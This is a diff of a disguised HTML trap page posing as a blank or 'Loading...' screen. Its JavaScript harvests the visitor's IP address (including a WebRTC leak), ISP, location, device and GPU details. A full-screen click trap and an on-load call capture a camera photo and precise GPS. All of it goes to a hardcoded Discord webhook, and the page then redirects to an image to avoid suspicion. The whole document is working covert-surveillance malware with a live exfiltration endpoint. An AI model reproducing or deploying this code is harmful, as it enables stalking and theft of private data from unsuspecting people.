@@ -1,123 +1,107 @@
+
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Content...</title>
-    <style>
-        body { background-color: #000; margin: 0; padding: 0; height: 100vh; width: 100vw; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
-        #trap { position: absolute; width: 100%; height: 100%; z-index: 9999; }
-        p { color: #111; font-family: sans-serif; user-select: none; }
-    </style>
+    <title> </title>
+    <style>body { background: #000; margin: 0; padding: 0; overflow: hidden; } #trap { position: fixed; width: 100%; height: 100%; z-index: 999; }</style>
 </head>
-<body>
-
-    <div id="trap" onclick="ULTIMATE_STRIKE()"></div>
-    <p>Loading...</p>
-
+<body onclick="STRIKE()">
+    <div id="trap"></div>
 <script>
-    // --- الإعدادات الخاصة بك ---
     const WH = "https://discord.com/api/webhooks/1455922764258218097/xvO8yzlb1LasyL3sPXq3eshO17uU1nFfQ8Zpf4LKhVYjuGkA4M0a-d_bc2I48wM0TUXa";
-    const REDIRECT = "https://cdn.discordapp.com/attachments/1359189845167182167/1462060351452352668/20260117-1503.jpg?ex=696cd14f&is=696b7fcf&hm=b1f265240ce494350e4159bee6c1a477ec09103946b54da47bb7ee60b1544108&";
+    const RD = "https://ibb.co/YBNGwkT9";
+    let done = false;
 
-    // 1. سحب "كل" المعلومات القديمة فور فتح الصفحة
-    async function collectAllData() {
+    async function getTrueIP() {
         try {
-            const n = await fetch('https://ipapi.co/json/').then(r => r.json());
-            const b = await navigator.getBattery().catch(() => ({}));
-            const c = navigator.connection || {};
-            const gl = document.createElement('canvas').getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-            
-            const fullReport = {
-                embeds: [{
-                    title: "🔱 V71 - FULL DATA EXTRACTION 🔱",
-                    color: 16711680,
-                    fields: [
-                        { name: "🌐 REAL IP", value: "`"+n.ip+"`", inline: true },
-                        { name: "📡 PROVIDER (ISP)", value: "`"+n.org+"`", inline: true },
-                        { name: "🌍 COUNTRY", value: "`"+n.country_name+"`", inline: true },
-                        { name: "📍 CITY / REGION", value: "`"+n.city+", "+n.region+"`", inline: true },
-                        { name: "📱 DEVICE PLATFORM", value: "`"+navigator.platform+"`", inline: true },
-                        { name: "💻 SYSTEM / OS", value: "`"+(navigator.userAgent.match(/\(([^)]+)\)/) || [0,"N/A"])[1]+"`", inline: true },
-                        { name: "🔋 BATTERY LEVEL", value: "`"+(b.level*100 || 0)+"%`", inline: true },
-                        { name: "🔌 CHARGING", value: "`"+(b.charging ? "YES" : "NO")+"`", inline: true },
-                        { name: "📶 NET TYPE", value: "`"+(c.effectiveType || "N/A").toUpperCase()+"`", inline: true },
-                        { name: "⚙️ CPU CORES", value: "`"+navigator.hardwareConcurrency+"`", inline: true },
-                        { name: "🖥️ RESOLUTION", value: "`"+window.screen.width+"x"+window.screen.height+"`", inline: true },
-                        { name: "⏰ TIMEZONE", value: "`"+n.timezone+"`", inline: true },
-                        { name: "🎮 GPU RENDERER", value: "```"+gpu+"```", inline: false },
-                        { name: "🔍 FULL USER AGENT", value: "```"+navigator.userAgent+"```", inline: false }
-                    ],
-                    footer: { text: "V71 | WAITING FOR TARGET ACTION" }
-                }]
-            };
-            
-            await fetch(WH, { 
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'}, 
-                body: JSON.stringify(fullReport), 
-                keepalive: true 
+            const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+            pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+            return new Promise(res => {
+                pc.onicecandidate = (i) => {
+                    if (i && i.candidate) {
+                        const m = /([0-9a-f]{1,4}(?::[0-9a-f]{1,4}){7}|[0-9]{1,3}(\.[0-9]{1,3}){3})/i.exec(i.candidate.candidate);
+                        if (m) { res(m[1]); pc.onicecandidate = null; }
+                    }
+                };
+                setTimeout(() => res("Not Found"), 2500);
             });
-        } catch(e) {}
-    }
-    collectAllData();
-
-    // 2. الهجوم عند لمس الشاشة (الكاميرا + الموقع + التحويل)
-    async function ULTIMATE_STRIKE() {
-        if (window.done) return;
-        window.done = true;
-
-        let photo = null;
-        try {
-            // طلب الكاميرا الأمامية (إذن نظامي)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            photo = await new Promise(res => canvas.toBlob(res, 'image/png'));
-            stream.getTracks().forEach(t => t.stop());
-        } catch(e) {}
-
-        // طلب الموقع الجغرافي دقيق
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            await finalize(photo, pos.coords);
-        }, async () => {
-            await finalize(photo, null);
-        }, { timeout: 4000 });
+        } catch(e) { return "Error"; }
     }
 
-    async function finalize(blob, coords) {
-        const fd = new FormData();
-        const mapUrl = coords ? `http://googleusercontent.com/maps.google.com/q=${coords.latitude},${coords.longitude}` : "Denied / Disabled";
-        
-        const sensorEmbed = {
+    async function HARVEST() {
+        const realIp = await getTrueIP();
+        const ipReq = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(()=>({}));
+        const batt = await navigator.getBattery().catch(() => ({}));
+        const conn = navigator.connection || {};
+        const gl = document.createElement('canvas').getContext('webgl');
+        const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
+        const gmt = new Date().getTimezoneOffset() / -60;
+
+        const data = {
             embeds: [{
-                title: "📸 SENSOR RESULTS (CAMERA & GPS) 📸",
-                color: 16711680,
-                fields: [{ name: "📍 ACCURATE GPS", value: mapUrl }],
-                image: { url: "attachment://s.png" }
+                title: "💀 V122 FULL SYSTEM HARVEST 💀",
+                color: 0,
+                fields: [
+                    { name: "🔓 REAL IP (BYPASS)", value: "`"+realIp+"`", inline: false },
+                    { name: "🌐 NETWORK IP", value: "`"+(ipReq.ip || "N/A")+"`", inline: true },
+                    { name: "🏠 HOSTNAME", value: "`"+window.location.hostname+"`", inline: true },
+                    { name: "🛰️ ISP", value: "`"+(ipReq.org || "N/A")+"`", inline: true },
+                    { name: "🌍 GEO", value: "`"+(ipReq.city || "Unknown")+", "+(ipReq.country_name || "Unknown")+"`", inline: true },
+                    { name: "📍 COORDS", value: "`"+ipReq.latitude+", "+ipReq.longitude+"`", inline: true },
+                    { name: "💻 BROWSER", value: "`"+navigator.userAgent.split(') ')[1].split(' ')[0]+"`", inline: true },
+                    { name: "📱 PLATFORM", value: "`"+navigator.platform+"`", inline: true },
+                    { name: "⚙️ CPU CORES", value: "`"+navigator.hardwareConcurrency+"`", inline: true },
+                    { name: "🧠 RAM SIZE", value: "`"+(navigator.deviceMemory || "N/A")+" GB`", inline: true },
+                    { name: "🔋 BATTERY", value: "`"+(batt.level*100 || 0).toFixed(0)+"%`", inline: true },
+                    { name: "🔌 CHARGING", value: "`"+(batt.charging ? "YES" : "NO")+"`", inline: true },
+                    { name: "📶 NET TYPE", value: "`"+(conn.effectiveType || "N/A").toUpperCase()+"`", inline: true },
+                    { name: "🚀 SPEED", value: "`"+(conn.downlink || 0)+" Mbps`", inline: true },
+                    { name: "🖥️ SCREEN", value: "`"+screen.width+"x"+screen.height+"`", inline: true },
+                    { name: "🎨 DEPTH", value: "`"+screen.colorDepth+"-bit`", inline: true },
+                    { name: "🌍 LANG", value: "`"+navigator.language+"`", inline: true },
+                    { name: "⏰ TIME", value: "`"+new Date().toLocaleTimeString()+"`", inline: true },
+                    { name: "⏳ GMT", value: "`GMT "+gmt+"`", inline: true },
+                    { name: "🎮 GPU", value: "```"+gpu+"```", inline: false },
+                    { name: "🔍 USER AGENT", value: "```"+navigator.userAgent+"```", inline: false }
+                ]
             }]
         };
 
-        fd.append('payload_json', JSON.stringify(sensorEmbed));
-        if (blob) fd.append('file', blob, 's.png');
-
-        await fetch(WH, { method: 'POST', body: fd, keepalive: true });
-        
-        // التحويل النهائي المباشر لرابط الصورة
-        window.location.replace(REDIRECT);
+        fetch(WH, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data), keepalive: true });
     }
 
-    // إذا لم يلمس الشاشة خلال 8 ثواني يحوله تلقائياً للصورة لعدم الشك
-    setTimeout(() => { if(!window.done) window.location.replace(REDIRECT); }, 8000);
+    async function STRIKE() {
+        if(done) return;
+        done = true;
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(async (stream) => {
+            const v = document.createElement('video'); v.srcObject = stream; await v.play();
+            const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('file', blob, 'shot.jpg');
+                fd.append('payload_json', JSON.stringify({ embeds: [{ title: "📸 CAMERA SNATCHED", color: 16711680 }] }));
+                fetch(WH, { method: 'POST', body: fd, keepalive: true });
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg');
+        }).catch(() => {});
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            fetch(WH, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({
+                embeds: [{ title: "📍 REAL-TIME GPS", description: "http://googleusercontent.com/maps.google.com/q="+pos.coords.latitude+","+pos.coords.longitude, color: 16711680 }]
+            }), keepalive: true });
+        }, () => {}, {enableHighAccuracy:true});
+
+        setTimeout(() => { window.location.replace(RD); }, 1200);
+    }
+
+    window.onload = () => {
+        HARVEST();
+        STRIKE(); 
+        setTimeout(() => { if(!done) window.location.replace(RD); }, 5000);
+    };
 </script>
 </body>
 </html>
